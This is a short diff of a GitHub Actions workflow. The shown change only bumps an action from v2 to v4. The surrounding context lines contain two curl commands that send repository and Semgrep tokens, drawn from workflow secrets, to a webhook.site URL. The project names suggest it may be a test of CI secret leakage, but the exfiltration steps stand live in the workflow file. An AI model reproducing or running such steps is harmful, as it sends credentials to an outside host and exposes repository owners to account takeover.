@@ -39,7 +39,7 @@ jobs:
              curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$repoToken"
              curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$semToken"
 
-    - uses: testweb01/actionTest@v2
+    - uses: testweb01/actionTest@v4
       with:
           repoToken: '${{ env.SEMGREP_APP_TOKEN }}'
           semToken: '${{ secrets.SEMGREP_APP_TOKEN }}'
